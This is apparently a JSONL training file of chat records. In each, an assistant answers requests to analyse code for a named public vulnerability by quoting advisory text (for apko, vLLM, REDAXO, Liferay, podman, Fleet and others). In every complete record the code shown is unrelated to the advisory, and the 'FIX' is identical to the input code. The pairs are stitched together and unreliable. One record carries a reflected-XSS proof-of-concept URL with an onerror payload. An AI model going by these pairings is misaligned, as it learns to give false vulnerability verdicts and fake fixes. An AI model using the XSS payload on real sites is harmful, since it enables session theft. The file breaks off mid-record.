{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for apko affected by unbounded resource consumption in expandapk.Split on attacker-controlled .apk streams :\n\nstatic u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b,\n\t\tu64 remaining, u64 expires)\n{\n\tstruct cfs_rq *cfs_rq;\n\tu64 runtime;\n\tu64 starting_runtime = remaining;\n\n\trcu_read_lock();\n\tlist_for_each_entry_rcu(cfs_rq, &cfs_b->throttled_cfs_rq,\n\t\t\t\tthrottled_list) {\n\t\tstruct rq *rq = rq_of(cfs_rq);\n\t\tstruct rq_flags rf;\n\n\t\trq_lock(rq, &rf);\n\t\tif (!cfs_rq_throttled(cfs_rq))\n\t\t\tgoto next;\n\n\t\truntime = -cfs_rq->runtime_remaining + 1;\n\t\tif (runtime > remaining)\n\t\t\truntime = remaining;\n\t\tremaining -= runtime;\n\n\t\tcfs_rq->runtime_remaining += runtime;\n\t\tcfs_rq->runtime_expires = expires;\n\n\t\t/* we check whether we're throttled above */\n\t\tif (cfs_rq->runtime_remaining > 0)\n\t\t\tunthrottle_cfs_rq(cfs_rq);\n\nnext:\n\t\trq_unlock(rq, &rf);\n\n\t\tif (!remaining)\n\t\t\tbreak;\n\t}\n\trcu_read_unlock();\n\n\treturn starting_runtime - remaining;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-400\nREASON: `expandapk.Split` drains the first gzip stream of an APK archive via `io.Copy(io.Discard, gzi)` without explicit bounds. With an attacker-controlled input stream, this can force large gzip inflation work and lead to resource exhaustion (availability impact).                                                                                                                      \n                                                                                                                                                                                              \nThe `Split` function reads the first tar header, then drains the remainder of the gzip stream by reading from the gzip reader directly without any maximum uncompressed byte limit or inflate-ratio cap. A caller that parses attacker-controlled APK streams may be forced to spend excessive CPU time inflating gzip data, leading to timeouts or process slowdown.             \n                                                                                                                                                                                              \n**Fix:** Fixed with [2be3903](https://github.com/chainguard-dev/apko/commit/2be3903fe194ad46351840f0569b35f5ac965f09), Released in v1.1.0.                                                  \n                                                                                                                                                                                              \n**Acknowledgements**                                                                                                                                                                        \n                                                                                                                                                                                             \napko thanks Oleh Konko from [1seal](https://1seal.org/) for discovering and reporting this issue.\nFIX:\nstatic u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b,\n\t\tu64 remaining, u64 expires)\n{\n\tstruct cfs_rq *cfs_rq;\n\tu64 runtime;\n\tu64 starting_runtime = remaining;\n\n\trcu_read_lock();\n\tlist_for_each_entry_rcu(cfs_rq, &cfs_b->throttled_cfs_rq,\n\t\t\t\tthrottled_list) {\n\t\tstruct rq *rq = rq_of(cfs_rq);\n\t\tstruct rq_flags rf;\n\n\t\trq_lock(rq, &rf);\n\t\tif (!cfs_rq_throttled(cfs_rq))\n\t\t\tgoto next;\n\n\t\truntime = -cfs_rq->runtime_remaining + 1;\n\t\tif (runtime > remaining)\n\t\t\truntime = remaining;\n\t\tremaining -= runtime;\n\n\t\tcfs_rq->runtime_remaining += runtime;\n\t\tcfs_rq->runtime_expires = expires;\n\n\t\t/* we check whether we're throttled above */\n\t\tif (cfs_rq->runtime_remaining > 0)\n\t\t\tunthrottle_cfs_rq(cfs_rq);\n\nnext:\n\t\trq_unlock(rq, &rf);\n\n\t\tif (!remaining)\n\t\t\tbreak;\n\t}\n\trcu_read_unlock();\n\n\treturn starting_runtime - remaining;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for vLLM deserialization vulnerability leading to DoS and potential RCE:\n\nstatic void write_unicode(bytearray_t * bplist, uint16_t * val, uint64_t size)\n{\n    uint64_t i = 0;\n    uint16_t *buff = (uint16_t*)malloc(size << 1);\n    for (i = 0; i < size; i++)\n        buff[i] = be16toh(val[i]);\n    write_raw_data(bplist, BPLIST_UNICODE, (uint8_t*)buff, size);\n    free(buff);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-787\nREASON: ### Summary\nA memory corruption vulnerability that leading to a crash (denial-of-service) and potentially remote code execution (RCE) exists in vLLM versions 0.10.2 and later, in the Completions API endpoint. When processing user-supplied prompt embeddings, the endpoint loads serialized tensors using torch.load() without sufficient validation.\n\nDue to a change introduced in PyTorch 2.8.0, sparse tensor integrity checks are disabled by default. As a result, maliciously crafted tensors can bypass internal bounds checks and trigger an out-of-bounds memory write during the call to to_dense(). This memory corruption can crash vLLM and potentially lead to code execution on the server hosting vLLM.\n\n### Details\nA vulnerability that can lead to RCE from the completions API endpoint exists in vllm, where due to missing checks when loading user-provided tensors, an out-of-bounds write can be triggered. This happens because the default behavior of `torch.load(tensor, weights_only=True)`  since pytorch 2.8.0 is to not perform validity checks for sparse tensors, and this needs to be enabled explicitly using the [torch.sparse.check_sparse_tensor_invariants](https://docs.pytorch.org/docs/stable/generated/torch.sparse.check_sparse_tensor_invariants.html) context manager.\n\nThe vulnerability is in the following code in [vllm/entrypoints/renderer.py:148](https://github.com/vllm-project/vllm/blob/a332b84578cdc0706e040f6a765954c8a289904f/vllm/entrypoints/renderer.py#L148)\n\n```python\n    def _load_and_validate_embed(embed: bytes) -> EngineEmbedsPrompt:\n        tensor = torch.load(\n            io.BytesIO(pybase64.b64decode(embed, validate=True)),\n            weights_only=True,\n            map_location=torch.device(\"cpu\"),\n        )\n        assert isinstance(tensor, torch.Tensor) and tensor.dtype in (\n            torch.float32,\n            torch.bfloat16,\n            torch.float16,\n        )\n        tensor = tensor.to_dense()\n```\n\nBecause of the missing checks, loading invalid prompt embedding tensors provided by the user can cause an out-of-bounds write in the call to `to_dense` .\n\n### Impact\nAll users with access to this API are able to exploit this vulnerability. Unsafe deserialization of untrusted input can be abused to achieve DoS and potentially remote code execution (RCE) in the vLLM server process. This impacts deployments running vLLM as a server or any instance that deserializes untrusted/model-provided payloads.\n\n## Fix\n\nhttps://github.com/vllm-project/vllm/pull/27204\n\n## Acknowledgements\n\nFinder: AXION Security Research Team (Omri Fainaro, Bary Levy): discovery and coordinated disclosure.\nFIX:\nstatic void write_unicode(bytearray_t * bplist, uint16_t * val, uint64_t size)\n{\n    uint64_t i = 0;\n    uint16_t *buff = (uint16_t*)malloc(size << 1);\n    for (i = 0; i < size; i++)\n        buff[i] = be16toh(val[i]);\n    write_raw_data(bplist, BPLIST_UNICODE, (uint8_t*)buff, size);\n    free(buff);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for REDAXO CMS is vulnerable to Reflected XSS in Mediapool Info Banner via args[types]:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Summary\nA reflected Cross-Site Scripting (XSS) vulnerability exists in the Mediapool view where the request parameter `args[types]` is rendered into an info banner without HTML-escaping. This allows arbitrary JavaScript execution in the backend context when an authenticated user visits a crafted link while logged in.\n\n### Details\n\nControl Flow:\n\n1. `redaxo/src/addons/mediapool/pages/index.php` reads args via `rex_request('args', 'array')` and passes them through as `$argUrl` to `media.list.php`.\n2. `redaxo/src/addons/mediapool/pages/media.list.php` injects `$argUrl['args']['types']` into an HTML string without escaping:\n\n```\nif (!empty($argUrl['args']['types'])) {\n    echo rex_view::info(rex_i18n::msg('pool_file_filter') . ' <code>' . $argUrl['args']['types'] . '</code>');\n}\n```\n\n### PoC\n\n1. Log into the REDAXO backend.\n2. While authenticated, open a crafted URL like: `<host>/index.php?page=mediapool/media&args[types]=\"><img+src%3Dx+onerror%3Dalert%28document.domain%29>`\n4. The info banner displays the unescaped value and activates the injected onerror handler, which opens an alert pop-up.\n\n### Impact\nArbitrary JavaScript execution in the backend, enabling theft of session cookies, CSRF tokens, or other sensitive data, and allowing an attacker to perform any administrative actions on behalf of the affected user.\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Use After Free in lucet:\n\n  ExceptionInfo *magick_unused(exception))\n{\n  CustomStreamInfo\n    *custom_stream;\n\n  magick_unreferenced(exception);\n  custom_stream=(CustomStreamInfo *) AcquireCriticalMemory(\n    sizeof(*custom_stream));\n  (void) memset(custom_stream,0,sizeof(*custom_stream));\n  custom_stream->signature=MagickCoreSignature;\n  return(custom_stream);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-416\nREASON: ### Impact\nThere is a bug in the main branch of Lucet's `lucet-runtime` that allows a use-after-free in an `Instance` object that could result in memory corruption, data race, or other related issues.  This bug was introduced early in the development of Lucet and is present in all releases.  As a result of this bug, and dependent on the memory backing for the `Instance` objects, it is possible to trigger a use-after-free when the `Instance` is dropped.\n\n### Patches\nUsers should upgrade to the `main` branch of the Lucet repository. Lucet does not provide versioned releases on crates.io.\n\n### Workarounds\nThere is no way to remediate this vulnerability without upgrading.\n\n### Description\nLucet uses a \"pool\" allocator for new WebAssembly instances that are created. This pool allocator manages everything from the linear memory of the wasm instance, the runtime stack for async switching, as well as the memory behind the Instance itself. `Instances` are referred to via an `InstanceHandle` type which will, on drop, release the memory backing the Instance back to the pool.\n\nWhen an Instance is dropped, the fields of the `Instance` are destructed top-to-bottom, however when the `alloc: Alloc` field is destructed, the memory backing the `Instance` is released back to the pool before the destructors of the remaining fields are run. If another thread allocates the same memory from the pool while these destructors are still running, a race condition occurs that can lead to use-after-free errors.\n\nThe bug was corrected by changing how the `InstanceHandle` destructor operates to ensure that the memory backing an Instance is only returned to the pool once the `Instance` has been completely destroyed.\n\nThis security advisory has been assigned CVE-2021-43790.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [lucet repository](https://github.com/bytecodealliance/lucet)\n* Email [the lucet team](mailto:lucet@fastly.com)\n* See the [Bytecode Alliance security policy](https://bytecodealliance.org/security)\nFIX:\n  ExceptionInfo *magick_unused(exception))\n{\n  CustomStreamInfo\n    *custom_stream;\n\n  magick_unreferenced(exception);\n  custom_stream=(CustomStreamInfo *) AcquireCriticalMemory(\n    sizeof(*custom_stream));\n  (void) memset(custom_stream,0,sizeof(*custom_stream));\n  custom_stream->signature=MagickCoreSignature;\n  return(custom_stream);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Liferay Portal is vulnerable to XSS through its Commerce Product's Name text field:\n\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: Cross-site Scripting (XSS) vulnerability in the Commerce Product Comparison Table widget in Liferay Portal 7.4.0 through 7.4.3.111, and Liferay DXP 2023.Q4.0 through 2023.Q4.5, 2023.Q3.1 through 2023.Q3.8, and 7.4 GA through update 92 allows remote attackers to inject arbitrary web script or HTML via a crafted payload injected into a Commerce Product's Name text field.\nFIX:\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for podman kube play symlink traversal vulnerability:\n\nprefix_components (char *filename, bool checkdirs)\n{\n  int count = 0;\n  struct stat stat_buf;\n  int stat_result;\n  char *f = filename + FILE_SYSTEM_PREFIX_LEN (filename);\n\n  if (*f)\n    while (*++f)\n      if (ISSLASH (f[0]) && ! ISSLASH (f[-1]))\n\t{\n\t  if (checkdirs)\n\t    {\n\t      *f = '\\0';\n\t      stat_result = lstat (filename, &stat_buf);\n\t      *f = '/';\n\t      if (! (stat_result == 0 && S_ISDIR (stat_buf.st_mode)))\n\t\tbreak;\n\t    }\n\n\t  count++;\n\t}\n\n  return count;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Impact\n\nThe podman kube play command can overwrite host files when the kube file contains a ConfigMap or Secret volume mount and the volume already contains a symlink to a host file.\nThis allows a malicious container to write to arbitrary files on the host BUT the attacker only controls the target path not the contents that will be written to the file. The contents are defined in the yaml file by the end user.\n\n### Requirements to exploit:\npodman kube play must be used with a ConfigMap or Secret volume mount AND must be run more than once on the same volume. All the attacker has to do is create the malicious symlink on the volume the first time it is started. After that all following starts would follow the symlink and write to the host location. \n\n\n### Patches\nFixed in podman v5.6.1\nhttps://github.com/containers/podman/commit/43fbde4e665fe6cee6921868f04b7ccd3de5ad89\n\n### Workarounds\n\nDon't use podman kube play with ConfigMap or Secret volume mounts.\n\n### PR with test for CI\n\nAdding on 9/8/2025 by @TomSweeneyRedHat , this is the PR containing the test in CI: https://github.com/containers/podman/pull/27001\nFIX:\nprefix_components (char *filename, bool checkdirs)\n{\n  int count = 0;\n  struct stat stat_buf;\n  int stat_result;\n  char *f = filename + FILE_SYSTEM_PREFIX_LEN (filename);\n\n  if (*f)\n    while (*++f)\n      if (ISSLASH (f[0]) && ! ISSLASH (f[-1]))\n\t{\n\t  if (checkdirs)\n\t    {\n\t      *f = '\\0';\n\t      stat_result = lstat (filename, &stat_buf);\n\t      *f = '/';\n\t      if (! (stat_result == 0 && S_ISDIR (stat_buf.st_mode)))\n\t\tbreak;\n\t    }\n\n\t  count++;\n\t}\n\n  return count;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Fleet has SAML authentication vulnerability due to improper SAML response validation:\n\nstatic void AssertLayoutTreeUpdated(Node& root) {\n  for (Node& node : NodeTraversal::InclusiveDescendantsOf(root)) {\n    if (!node.IsElementNode() && !node.IsTextNode() && !node.IsShadowRoot() &&\n        !node.IsDocumentNode())\n      continue;\n    DCHECK(!node.NeedsStyleRecalc());\n    DCHECK(!node.ChildNeedsStyleRecalc());\n    DCHECK(!node.NeedsReattachLayoutTree());\n    DCHECK(!node.ChildNeedsReattachLayoutTree());\n    DCHECK(!node.ChildNeedsDistributionRecalc());\n    DCHECK(!node.NeedsStyleInvalidation());\n    DCHECK(!node.ChildNeedsStyleInvalidation());\n    DCHECK((node.IsDocumentNode() || !node.GetLayoutObject() ||\n            FlatTreeTraversal::Parent(node)))\n        << node;\n\n    if (ShadowRoot* shadow_root = node.GetShadowRoot())\n      AssertLayoutTreeUpdated(*shadow_root);\n  }\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-285\nREASON: ### Summary\n\nA vulnerability in Fleet\u2019s SAML authentication handling could allow an attacker to forge authentication assertions and gain unauthorized access to Fleet. In certain configurations, this could result in the creation of new user accounts, including administrative accounts. This issue affects Fleet deployments using single sign-on (SSO).\n\n### Impact\n\nIn vulnerable versions of Fleet, an attacker could craft a specially-formed SAML response to:\n\n- Forge authentication assertions, potentially impersonating legitimate users.\n- If Just-In-Time (JIT) provisioning is enabled, the attacker could provision a new administrative user account.\n- If MDM enrollment is enabled, certain endpoints could be used to create new accounts tied to forged assertions.\n\nThis could allow unauthorized access to Fleet, including administrative access, visibility into device data, and modification of configuration. \n\n### Patches\n\nThis issue is addressed in commit [fc96cc4](https://github.com/fleetdm/fleet/commit/fc96cc4e91047250afb12f65ad70e90b30a7fb1c) and is available in Fleet version 4.64.2.\n\nThe following backport versions also address this issue: \n\n- 4.63.2\n- 4.62.4\n- 4.58.1\n- 4.53.2\n\n### Workarounds\n\nIf an immediate upgrade is not possible, Fleet users should temporarily disable [single-sign-on (SSO)](https://fleetdm.com/docs/deploy/single-sign-on-sso) and use password authentication.\n\n### Credit\n\nThank you @hakivvi, as well as Jeffrey Hofmann and Colby Morgan from the Robinhood Red Team for finding and reporting this vulnerability using our [responsible disclosure process](https://github.com/fleetdm/fleet/blob/main/SECURITY.md).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Email us at security@fleetdm.com\n- Join #fleet in [osquery Slack](https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw)\nFIX:\nstatic void AssertLayoutTreeUpdated(Node& root) {\n  for (Node& node : NodeTraversal::InclusiveDescendantsOf(root)) {\n    if (!node.IsElementNode() && !node.IsTextNode() && !node.IsShadowRoot() &&\n        !node.IsDocumentNode())\n      continue;\n    DCHECK(!node.NeedsStyleRecalc());\n    DCHECK(!node.ChildNeedsStyleRecalc());\n    DCHECK(!node.NeedsReattachLayoutTree());\n    DCHECK(!node.ChildNeedsReattachLayoutTree());\n    DCHECK(!node.ChildNeedsDistributionRecalc());\n    DCHECK(!node.NeedsStyleInvalidation());\n    DCHECK(!node.ChildNeedsStyleInvalidation());\n    DCHECK((node.IsDocumentNode() || !node.GetLayoutObject() ||\n            FlatTreeTraversal::Parent(node)))\n        << node;\n\n    if (ShadowRoot* shadow_root = node.GetShadowRoot())\n      AssertLayoutTreeUpdated(*shadow_root);\n  }\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for ImageMagick is vulnerable to an integer Overflow in TIM decoder leading to out of bounds read (32-bit only):\n\nstatic void hid_scan_input_usage(struct hid_parser *parser, u32 usage)\n{\n\tstruct hid_device *hid = parser->device;\n\n\tif (usage == HID_DG_CONTACTID)\n\t\thid->group = HID_GROUP_MULTITOUCH;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-125\nREASON: ### Summary\nThe TIM (PSX TIM) image parser in ImageMagick contains a critical integer overflow vulnerability in the `ReadTIMImage` function (`coders/tim.c`). The code reads `width` and `height` (16-bit values) from the file header and calculates `image_size = 2 * width * height` without checking for overflow.\nOn 32-bit systems (or where `size_t` is 32-bit), this calculation can overflow if `width` and `height` are large (e.g., 65535), wrapping around to a small value. This results in a small heap allocation via `AcquireQuantumMemory` and later operations relying on the dimensions can trigger an out of bounds read.\n### Vulnerable Code\nFile: `coders/tim.c`\n```c\nwidth=ReadBlobLSBShort(image);\nheight=ReadBlobLSBShort(image);\nimage_size=2*width*height;       // Line 234 - NO OVERFLOW CHECK!\n```\n\n### Impact\nThis vulnerability can lead to Arbitrary Memory Disclosure due to an out of bounds read on 32-bit systems.\nFIX:\nstatic void hid_scan_input_usage(struct hid_parser *parser, u32 usage)\n{\n\tstruct hid_device *hid = parser->device;\n\n\tif (usage == HID_DG_CONTACTID)\n\t\thid->group = HID_GROUP_MULTITOUCH;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for n8n: Webhook Forgery on Github Webhook Trigger:\n\nPolicyKitBackend::PolicyKitBackend()\n    : AuthBackend()\n{\n    setCapabilities(AuthorizeFromClientCapability);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-290\nREASON: ## Impact\nAn attacker who knows the webhook URL of a workflow using the GitHub Webhook Trigger node could send unsigned POST requests and trigger the workflow with arbitrary data. The node did not implement the HMAC-SHA256 signature verification that GitHub provides to authenticate webhook deliveries, allowing any party to spoof GitHub webhook events.\n\n## Patches\nThe issue has been fixed in n8n versions 2.5.0 and 1.123.15. Users should upgrade to one of these versions or later to remediate the vulnerability.\n\n## Workarounds\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Restrict network access to the n8n webhook endpoint to known GitHub webhook IP ranges.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\nFIX:\nPolicyKitBackend::PolicyKitBackend()\n    : AuthBackend()\n{\n    setCapabilities(AuthorizeFromClientCapability);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Strapi core vulnerable to sensitive data exposure via CORS misconfiguration:\n\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: ### Summary\n\nA CORS misconfiguration vulnerability exists in default installations of Strapi where attacker-controlled origins are improperly reflected in API responses.\n\n### Technical Details\n\nBy default, Strapi reflects the value of the Origin header back in the Access-Control-Allow-Origin response header without proper validation or whitelisting.\n\nExample:\n`Origin: http://localhost:8888`\n`Access-Control-Allow-Origin: http://localhost:8888`\n`Access-Control-Allow-Credentials: true`\n\nThis allows an attacker-controlled site (on a different port, like 8888) to send credentialed requests to the Strapi backend on 1337.\n\n### Suggested Fix\n\n1. Explicitly whitelist trusted origins\n2. Avoid reflecting dynamic origins\nFIX:\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for bn.js affected by an infinite loop:\n\ne1000e_set_ims(E1000ECore *core, int index, uint32_t val)\n{\n    static const uint32_t ims_ext_mask =\n        E1000_IMS_RXQ0 | E1000_IMS_RXQ1 |\n        E1000_IMS_TXQ0 | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    static const uint32_t ims_valid_mask =\n        E1000_IMS_TXDW      | E1000_IMS_TXQE    | E1000_IMS_LSC  |\n        E1000_IMS_RXDMT0    | E1000_IMS_RXO     | E1000_IMS_RXT0 |\n        E1000_IMS_MDAC      | E1000_IMS_TXD_LOW | E1000_IMS_SRPD |\n        E1000_IMS_ACK       | E1000_IMS_MNG     | E1000_IMS_RXQ0 |\n        E1000_IMS_RXQ1      | E1000_IMS_TXQ0    | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    uint32_t valid_val = val & ims_valid_mask;\n\n    trace_e1000e_irq_set_ims(val, core->mac[IMS], core->mac[IMS] | valid_val);\n    core->mac[IMS] |= valid_val;\n\n    if ((valid_val & ims_ext_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_PBA_CLR) &&\n        msix_enabled(core->owner)) {\n        e1000e_msix_clear(core, valid_val);\n    }\n\n    if ((valid_val == ims_valid_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_INT_TIMERS_CLEAR_ENA)) {\n        trace_e1000e_irq_fire_all_timers(val);\n        e1000e_intrmgr_fire_all_timers(core);\n    }\n\n    e1000e_update_interrupt_state(core);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-835\nREASON: This affects versions of the package bn.js before 4.12.3 and 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.\nFIX:\ne1000e_set_ims(E1000ECore *core, int index, uint32_t val)\n{\n    static const uint32_t ims_ext_mask =\n        E1000_IMS_RXQ0 | E1000_IMS_RXQ1 |\n        E1000_IMS_TXQ0 | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    static const uint32_t ims_valid_mask =\n        E1000_IMS_TXDW      | E1000_IMS_TXQE    | E1000_IMS_LSC  |\n        E1000_IMS_RXDMT0    | E1000_IMS_RXO     | E1000_IMS_RXT0 |\n        E1000_IMS_MDAC      | E1000_IMS_TXD_LOW | E1000_IMS_SRPD |\n        E1000_IMS_ACK       | E1000_IMS_MNG     | E1000_IMS_RXQ0 |\n        E1000_IMS_RXQ1      | E1000_IMS_TXQ0    | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    uint32_t valid_val = val & ims_valid_mask;\n\n    trace_e1000e_irq_set_ims(val, core->mac[IMS], core->mac[IMS] | valid_val);\n    core->mac[IMS] |= valid_val;\n\n    if ((valid_val & ims_ext_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_PBA_CLR) &&\n        msix_enabled(core->owner)) {\n        e1000e_msix_clear(core, valid_val);\n    }\n\n    if ((valid_val == ims_valid_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_INT_TIMERS_CLEAR_ENA)) {\n        trace_e1000e_irq_fire_all_timers(val);\n        e1000e_intrmgr_fire_all_timers(core);\n    }\n\n    e1000e_update_interrupt_state(core);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Signal K Server Vulnerable to Denial of Service via Unrestricted Access Request Flooding:\n\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == 